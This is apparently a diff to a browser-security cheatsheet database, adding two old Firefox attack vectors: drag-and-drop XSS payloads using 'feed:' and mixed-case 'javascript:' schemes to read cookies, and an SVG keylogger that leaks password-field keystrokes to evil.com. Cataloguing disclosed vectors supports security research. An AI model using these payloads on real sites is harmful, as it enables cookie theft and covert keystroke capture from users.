@@ -4560,5 +4560,75 @@ var items =
         },
         'tags'      : [ 'mathml', 'xss', 'inline', 'firefox'],
         'reporter'  : '.mario'
+    },
+    { /* ID 131 - Passive XSS via Drag&Drop of specially crafted URIs  */
+        'id'        : 131,
+        'category'  : 'clickjacking',
+        'name'      : {
+            'en'    : 'Passive XSS via Drag&Drop of specially crafted URIs',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : '',
+            'zh'    : ''
+        },
+        'data'      : '<b>drag and drop one of the following strings to the drop box:</b>\r\n<br/><hr/>\r\njAvascript:alert(\'Top Page Location: \'+document.location+\' Host Page Cookies: \'+document.cookie);//\r\n<br/><hr/>\r\nfeed:javascript:alert(\'Top Page Location: \'+document.location+\' Host Page Cookies: \'+document.cookie);//\r\n<br/><hr/>\r\nfeed:data:text/html,&#x3c;script>alert(\'Top Page Location: \'+document.location+\' Host Page Cookies: \'+document.cookie)&#x3c;/script>&#x3c;b>\r\n<br/><hr/>\r\nfeed:feed:javAscript:javAscript:feed:alert(\'Top Page Location: \'+document.location+\' Host Page Cookies: \'+document.cookie);//\r\n<br/><hr/>\r\n<div id="dropbox" style="height: 360px;width: 500px;border: 5px solid #000;position: relative;" ondragover="event.preventDefault()">+ Drop Box +</div>',
+        'description' : {
+            'en'    : 'It is possible to bypass Mozilla Firefox (tested on version 8.x and 9.x) internal protection and execute Javascript Drag and Drop by using capitalization and Feed protocol, and to run that JavaScript on the top page if you can include the malicious page in an IFrame. The "event.preventDefault()" method in "ondragover" event of the element is to block the natural function of the browser. Usually the malicious IFrame should deceive the user to drag and drop a JS to the drop box which can be concealed in a hidden "Textarea" element.',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : '',
+            'zh'    : ''
+        },
+        'urls'      : ['https://bugzilla.mozilla.org/show_bug.cgi?id=704354', 'http://soroush.secproject.com/blog/2011/12/drag-and-drop-xss-in-firefox-by-html5-cross-domain-in-frames/', ''],
+        'howtofix'  : {
+            'en'    : '',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : '',
+            'zh'    : ''
+        },
+        'browsers'  : {
+            'firefox': ['6', '7', '8', '9']
+        },
+        'tags'      : [ 'drag&drop', 'html5', 'iframe', 'feed', 'firefox'],
+        'reporter'  : 'irsdl'
+    },
+    { /* ID 132 - SVG <set> and <animate> elements allow key-logging w/o JavaScript  */
+        'id'        : 132,
+        'category'  : 'svg',
+        'name'      : {
+            'en'    : 'SVG <set> and <animate> elements allow key-logging w/o JavaScript',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : '',
+            'zh'    : ''
+        },
+        'data'      : '<!doctype html>\r\n<form>\r\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\r\n<br>\r\n<input name="secret" type="password">\r\n</form>\r\n<!-- injection --><svg height="50px">\r\n<image xmlns:xlink="http://www.w3.org/1999/xlink">\r\n<set attributeName="xlink:href" begin="accessKey(a)" to="//evil.com/?a" />\r\n<set attributeName="xlink:href" begin="accessKey(b)" to="//evil.com/?b" />\r\n<set attributeName="xlink:href" begin="accessKey(c)" to="//evil.com/?c" />\r\n<set attributeName="xlink:href" begin="accessKey(d)" to="//evil.com/?d" />\r\n</image>\r\n</svg>',
+        'description' : {
+            'en'    : 'It is possible to achieve an injection capable to exfiltrate keyboard events without any JavaScript execution via SVG and set/animate timing attributes. In essence, an access key can be specified to trigger events inside an SVG. In case an inline SVG is being used, the listener for these keys observes the whole document - and not just the SVG itself. This essentially means that even keystrokes into a form input trigger the SVG access key handler. Once this access key is being combined with adding a new keystroke-depending image source to an existing image, the form input will be filled, and the SVG will reset a hidden image source according to the key being pressed and thereby silently exfiltrate the data. Since all this works without using any JavaScript, it was also possible to execute this attack in latest Thunderbird versions -- with the vector invisibly wrapped inside the mail-body. The problem has been reported and fixed, CVE-2011-3663 has been assigned.',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : '',
+            'zh'    : ''
+        },
+        'urls'      : ['http://www.mozilla.org/security/announce/2011/mfsa2011-56.html', 'https://bugzilla.mozilla.org/show_bug.cgi?id=704482', 'http://www.w3.org/TR/SVG/animate.html#TimingAttributes'],
+        'howtofix'  : {
+            'en'    : '',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : '',
+            'zh'    : ''
+        },
+        'browsers'  : {
+            'firefox': ['4', '5', '6', '7', '8', '9']
+        },
+        'tags'      : [ 'svg', 'html5', 'noscript', 'keylogger', 'firefox', 'thunderbird'],
+        'reporter'  : '.mario'
     }
 ]
